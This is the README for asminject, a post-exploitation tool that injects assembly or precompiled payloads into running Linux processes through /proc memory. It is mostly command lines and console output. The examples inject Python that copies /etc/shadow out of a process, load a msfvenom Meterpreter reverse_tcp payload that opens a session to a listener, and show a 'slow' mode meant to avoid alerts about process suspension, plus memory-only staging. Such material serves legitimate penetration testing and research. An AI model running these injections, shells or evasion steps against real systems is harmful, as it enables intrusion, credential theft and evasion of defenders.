# asminject
asminject is a heavily-modified fork of [David Buchanan's dlinject project](https://github.com/DavidBuchanan314/dlinject). Injects arbitrary assembly (or precompiled binary) payloads directly into Linux processes without the use of ptrace by accessing /proc/&lt;pid>/mem. Useful for certain post-exploitation scenarios, recovering content from process memory when ptrace is not available, and bypassing some security controls. Can inject into containerized processes from outside of the container, as long as you have root access on the host.

This is a very early, alpha-quality version of this utility.

## Origins

When the first version of *asminject* was written, *dlinject* was broken on modern Linux distributions because GNU had hidden the library-loading function in ld-x.y.so hidden. Regardless, the ability to inject arbitrary machine code is arguably stealthier.

## Setup

It's possible to write payloads in pure assembly without referring to libraries. If you're doing that, or using the example payloads that do that, or using a binary payload generated by e.g. *msfvenom*, you can skip this section.

Otherwise, you'll need to examine the list of binaries and libraries that your target process is using, e.g.:

```
# ps auxww | grep python2

user     2144330  0.2  0.1  13908  7864 pts/2    S+   15:30   0:00 python2 ./calling_script.py
                                                                                                                                    
# cat /proc/2144330/maps

560a14849000-560a14896000 r--p 00000000 08:01 3024520                    /usr/bin/python2.7
...omitted for brevity...
7fc63884b000-7fc638870000 r--p 00000000 08:01 3032318                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
...omitted for brevity...
7fc638a10000-7fc638a1f000 r--p 00000000 08:01 3032320                    /usr/lib/x86_64-linux-gnu/libm-2.31.so
...omitted for brevity...
7fc638b54000-7fc638b57000 r--p 00000000 08:01 3016732                    /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
...omitted for brevity...
7fc638b71000-7fc638b72000 r--p 00000000 08:01 3032333                    /usr/lib/x86_64-linux-gnu/libutil-2.31.so
...omitted for brevity...
7fc638b76000-7fc638b77000 r--p 00000000 08:01 3032319                    /usr/lib/x86_64-linux-gnu/libdl-2.31.so
...omitted for brevity...
7fc638b7c000-7fc638b83000 r--p 00000000 08:01 3032329                    /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
...omitted for brevity...
7fc638bc3000-7fc638bc4000 r--p 00000000 08:01 3031631                    /usr/lib/x86_64-linux-gnu/ld-2.31.so                                                                                                               
```

In this case, you could safely call exported functions in eight different binaries. Most of the example payloads will only use one or two, and will match their names based on regexes, but you'll still need to generate a list of the offsets for *asminject* to use. E.g. for this specific copy of */usr/bin/python2.7*:

```
readelf -a --wide /usr/bin/python2.7 | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > relative_offsets-some_machine-python2.7.txt
```

If you are injecting code into a containerized process from outside the container, you'll need to use the copy of each binary *from inside the container*, or you'll get the wrong data.

## Example 1: Execute arbitrary Python code inside an existing Python process

Launch a harmless Python process that simulates one with access to super-secret, sensitive data:

```
$ sudo python2 ./calling_script.py

('args:', ['test of example_class_1'])
[example_method_1] Example input was: test of example_class_1
Press enter to exit when finished
```

In a separate terminal, locate the process and inject some arbitrary Python code into it:

```
# ps auxww | grep python2

user     2144294  0.5  0.1  13908  7828 pts/2    S+   15:20   0:00 python2 ./calling_script.py

# python3 ./asminject.py 2144294 asm/x86-64/execute_python_code-01.s --relative-offsets relative_offsets-some_machine-python2.7.txt --pause --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.1
Ben Lincoln, Bishop Fox, 2021-06-07
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

[*] Sending SIGSTOP
[*] Waiting for process to stop...
[*] RIP: 0x7fb8b2389e8e
[*] RSP: 0x7ffc68bea978
[*] /usr/bin/python2.7: 0x0000556076bbb000
[*] /usr/lib/locale/locale-archive: 0x00007fb8b1e3e000
[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007fb8b2613000
[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007fb8b229b000
[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007fb8b25c6000
[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007fb8b2460000
[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007fb8b25cc000
[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007fb8b25c1000
[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007fb8b25a4000
[*] 0: 0x0000556076f31000
[*] [heap]: 0x0000556077db9000
[*] [stack]: 0x00007ffc68bcc000
[*] [vdso]: 0x00007ffc68bf8000
[*] [vvar]: 0x00007ffc68bf4000
[*] Writing assembled binary to /tmp/tmpw5w72z5m.o
[*] Wrote first stage shellcode
[*] Using '/usr/bin/python2.7' for regex placeholder '.+/python[0-9\.]+$' in assembly code
[*] Writing assembled binary to /tmp/tmpzc7wee_q.o
[*] Wrote stage 2 to '/tmp/tmp12ouuz74'
[*] If the target process is operating with a different filesystem root, copy the stage 2 binary to '/tmp/tmp12ouuz74' in the target container before proceeding
Press Enter to continue...
```

If the target process is a container, copy the binary into its filesystem at this time, then press Enter. Otherwise, just go ahead and press Enter.

```
[*] Continuing process...
[+] Done!
```

Back in the other terminal window, run the *fg* command. Python may segfault, but...

```
# cat /tmp/bishopfox.txt 
root:!:18704:0:99999:7:::
daemon:*:18704:0:99999:7:::
bin:*:18704:0:99999:7:::
sys:*:18704:0:99999:7:::
```

## Example 2: Inject Meterpreter into an existing Python process

Launch a harmless Python process that simulates one with access to super-secret, sensitive data:

```
$ sudo python2 ./calling_script.py

('args:', ['test of example_class_1'])
[example_method_1] Example input was: test of example_class_1
Press enter to exit when finished
```

In a separate terminal, generate a Meterpreter payload, then launch a listener:

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw -o lmrt11443 LHOST=127.0.0.1 LPORT=11443

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Saved as: lmrt11443

# msfconsole

...omitted for brevity...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 11443
LPORT => 11443
msf6 exploit(multi/handler) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:11443 
```

In a third terminal, locate the process and inject the Meterpreter payload into it:

```
# ps auxww | grep python2

root     2144475  0.0  0.1  10644  5172 pts/2    S+   15:44   0:00 sudo python2 ./calling_script.py
root     2144476  0.5  0.2  13884  8088 pts/2    S+   15:44   0:00 python2 ./calling_script.py

 python3 ./asminject.py 2144476 /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/lmrt11443 --pause --precompiled

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.1
Ben Lincoln, Bishop Fox, 2021-06-07
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

[*] Sending SIGSTOP
[*] RIP: 0x7f550c04ee8e
[*] RSP: 0x7ffc2a975a28
[*] /usr/bin/python2.7: 0x0000558e478a4000
[*] /usr/lib/locale/locale-archive: 0x00007f550bb03000
[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007f550c2d8000
[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007f550bf60000
[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007f550c28b000
[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007f550c125000
[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007f550c291000
[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007f550c286000
[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007f550c269000
[*] 0: 0x0000558e47c1a000
[*] [heap]: 0x0000558e48fbc000
[*] [stack]: 0x00007ffc2a956000
[*] [vdso]: 0x00007ffc2a9f1000
[*] [vvar]: 0x00007ffc2a9ed000
[*] Writing assembled binary to /tmp/tmp78ods3rv.o
[*] Wrote first stage shellcode
[*] Wrote stage 2 to '/tmp/tmpcmwfovsm'
[*] If the target process is operating with a different filesystem root, copy the stage 2 binary to '/tmp/tmpcmwfovsm' in the target container before proceeding
Press Enter to continue...
[*] Continuing process...
[+] Done!
```

In the first terminal, run the *fg* command, and you should see the following pop up in the third terminal:

```
[*] Sending stage (3008420 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:11443 -> 127.0.0.1:53682) at 2021-06-07 14:44:14 -0700

meterpreter > sysinfo
Computer     : 192.168.218.135
OS           : Debian  (Linux 5.10.0-kali3-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux

```

## Example 3: Using "slow" mode to help avoid triggerinng alerts related to process suspension

```
# python3 ./asminject.py 1470158 /mnt/hgfs/c/Users/blincoln/Documents/GitHub/asminject/asm/x86-64/execute_python_code-01.s --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.2
Ben Lincoln, Bishop Fox, 2021-08-30
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
[*] Current process priority for asminject.py (PID: 1470165) is 0
[*] Current CPU affinity for asminject.py (PID: 1470165) is [0, 1]
[*] Current process priority for target process (PID: 1470158) is 0
[*] Current CPU affinity for target process (PID: 1470158) is [0, 1]
[*] Setting process priority for asminject.py (PID: 1470165) to -20
[*] Setting process priority for target process (PID: 1470158) to 20
[*] Setting CPU affinity for target process (PID: 1470158) to [0, 1]
[*] RIP: 0x7fdbf1322e8e
[*] RSP: 0x7ffe6deb9ef8
[*] /usr/bin/python2.7: 0x0000564f2a554000
[*] /usr/lib/locale/locale-archive: 0x00007fdbf0dd7000
[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007fdbf15ad000
[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007fdbf1234000
[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007fdbf155f000
[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007fdbf13f9000
[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007fdbf1565000
[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007fdbf155a000
[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007fdbf153d000
[*] 0: 0x0000564f2a8ca000
[*] [heap]: 0x0000564f2bdc9000
[*] [stack]: 0x00007ffe6de9b000
[*] [vdso]: 0x00007ffe6df75000
[*] [vvar]: 0x00007ffe6df71000
[*] Writing assembled binary to /tmp/tmpfuwj2jq0.o
[*] Wrote first stage shellcode
[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.31.so$' in assembly code
[*] Using '/usr/bin/python2.7' for regex placeholder '.+/python[0-9\.]+$' in assembly code
[*] Writing assembled binary to /tmp/tmp79q8enyd.o
[*] Wrote stage 2 to '/tmp/tmppjmn1rr6'
[*] Returning to normal time...
[*] Setting process priority for asminject.py (PID: 1470165) to 0
[*] Setting process priority for target process (PID: 1470158) to 0
[*] Setting CPU affinity for target process (PID: 1470158) to [0, 1]
[+] Done!

```

## Example 4: Specifying non-PIC code

Some binaries are compiled without the position-independent code build option (including, strangely enough, Python 3.x, even though 2.x had it enabled). This means that the offsets in the corresponding ELF are absolute instead of relative to the base address. If *asminject.py* detects a low base address (typically indicative of this condition), it will include a warning:

```
[*] '/usr/bin/python3.9' has a base address of 4194304, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary "/usr/bin/python3.9" to your asminject.py options.
```

As the message indicates, this type of binary can be manually flagged using one or more *--non-pic-binary* options, which are parsed as regular expressions. e.g.:

```
# python3 ./asminject.py 1470214 /mnt/hgfs/c/Users/blincoln/Documents/GitHub/asminject/asm/x86-64/execute_python_code-01.s --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-bin-python3.9-2021-08-30.txt --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');" --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" --pause false

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.2
Ben Lincoln, Bishop Fox, 2021-08-30
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
[*] Current process priority for asminject.py (PID: 1470219) is 0
[*] Current CPU affinity for asminject.py (PID: 1470219) is [0, 1]
[*] Current process priority for target process (PID: 1470214) is 0
[*] Current CPU affinity for target process (PID: 1470214) is [0, 1]
[*] Setting process priority for asminject.py (PID: 1470219) to -20
[*] Setting process priority for target process (PID: 1470214) to 20
[*] Setting CPU affinity for target process (PID: 1470214) to [0, 1]
[*] RIP: 0x7f86441bde8e
[*] RSP: 0x7fff5bc4e738
[*] Handling '/usr/bin/python3.9' as non-PIC binary
[*] /usr/bin/python3.9: 0x0000000000000000
[*] /usr/lib/locale/locale-archive: 0x00007f8643de5000
[*] /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache: 0x00007f8644472000
[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007f8644479000
[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007f86440cf000
[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007f864442b000
[*] /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.12: 0x00007f86442b3000
[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007f86442e2000
[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007f8644431000
[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007f8644426000
[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007f8644296000
[*] 0: 0x000000000093b000
[*] [heap]: 0x0000000000a68000
[*] [stack]: 0x00007fff5bc30000
[*] [vdso]: 0x00007fff5bdbf000
[*] [vvar]: 0x00007fff5bdbb000
[*] Writing assembled binary to /tmp/tmpuufiyykt.o
[*] Wrote first stage shellcode
[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.31.so$' in assembly code
[*] Using '/usr/bin/python3.9' for regex placeholder '.+/python[0-9\.]+$' in assembly code
[*] Writing assembled binary to /tmp/tmpp73j5_e4.o
[*] Wrote stage 2 to '/tmp/tmpsxhy1l3y'
[*] Returning to normal time...
[*] Setting process priority for asminject.py (PID: 1470219) to 0
[*] Setting process priority for target process (PID: 1470214) to 0
[*] Setting CPU affinity for target process (PID: 1470214) to [0, 1]
[+] Done!

```

## Example 5: Using memory-only staging

asminject.py currently defaults to a file-based second stage (based on the one in dlinject.py), but supports memory-only staging as well:

```
 python3 ./asminject.py 1472534 /mnt/hgfs/c/Users/blincoln/Documents/GitHub/asminject/asm/x86-64/execute_python_code-01.s --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false --stage-mode mem

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.2
Ben Lincoln, Bishop Fox, 2021-08-30
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
[*] Current process priority for asminject.py (PID: 1472539) is 0
[*] Current CPU affinity for asminject.py (PID: 1472539) is [0, 1]
[*] Current process priority for target process (PID: 1472534) is 0
[*] Current CPU affinity for target process (PID: 1472534) is [0, 1]
[*] Setting process priority for asminject.py (PID: 1472539) to -20
[*] Setting process priority for target process (PID: 1472534) to 20
[*] Setting CPU affinity for target process (PID: 1472534) to [0, 1]
[*] RIP: 0x7f89ea341e8e
[*] RSP: 0x7ffd409c1278
[*] /usr/bin/python2.7: 0x00005615556d9000
[*] /usr/lib/locale/locale-archive: 0x00007f89e9df6000
[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007f89ea5cc000
[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007f89ea253000
[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007f89ea57e000
[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007f89ea418000
[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007f89ea584000
[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007f89ea579000
[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007f89ea55c000
[*] 0: 0x0000561555a4f000
[*] [heap]: 0x0000561556a8b000
[*] [stack]: 0x00007ffd409a3000
[*] [vdso]: 0x00007ffd409f3000
[*] [vvar]: 0x00007ffd409ef000
[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.31.so$' in assembly code
[*] Writing assembled binary to /tmp/tmprdbl1tj9.o
[*] RSP is 0x00007ffd409c1278
[*] Value at RSP is 0x00007f89ea2d489a
[*] MMAP'd block is 0x00007f89e9dc8b14
[*] Wrote first stage shellcode at 00007f89ea341e8e in target  [rpcess ,e,pru
[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.31.so$' in assembly code
[*] Using '/usr/bin/python2.7' for regex placeholder '.+/python[0-9\.]+$' in assembly code
[*] Writing assembled binary to /tmp/tmpqft8zspj.o
[*] RSP is 0x00007ffd409c1278
[*] Value at RSP is 0x00007f89ea2d489a
[*] MMAP'd block is 0x00007f89e9dc8b14
[*] Waiting for stage 1
[*] RSP is 0x00007ffd409c1278
[*] Value at RSP is 0x00007f89ea2d489a
[*] MMAP'd block is 0x00007f89e9dc8b14
[*] Waiting for stage 1
[*] RSP is 0x00007ffd409c1278
[*] Value at RSP is 0x00007f89ea2d489a
[*] MMAP'd block is 0x00007f89e9dc8b14
[*] Waiting for stage 1
[*] RSP is 0x00007ffd409c1278
[*] Value at RSP is 0x00007f89ea2d489a
[*] MMAP'd block is 0x00007f89e9dc8b14
[*] Waiting for stage 1
[*] Couldn't retrieve current syscall values
[*] Waiting for stage 1
[*] Couldn't retrieve current syscall values
[*] Waiting for stage 1
[*] RSP is 0x00007ffd409c11d8
[*] Value at RSP is 0x0000000000000000
[*] MMAP'd block is 0x00007f89ea5c4000
[*] Writing stage 2 to 0x00007f89ea5c4000 in target memory
[*] Writing 0x01 to 0x00007ffd409c11d8 in target memory to indicate OK
[*] Stage 2 proceeding
[*] Returning to normal time...
[*] Setting process priority for asminject.py (PID: 1472539) to 0
[*] Setting process priority for target process (PID: 1472534) to 0
[*] Setting CPU affinity for target process (PID: 1472534) to [0, 1]
[+] Done!

```

### Version history

#### 0.3 (2021-08-30)

- Still an internal development build
- Implemented "mem" staging method

#### 0.2 (2021-08-30)

- Still an internal development build
- Implemented "slow" stop method
- Implemented support for non-PIC binaries, like Python 3.x
- Various bug fixes

#### 0.1 (2021-06-07)

Internal development build
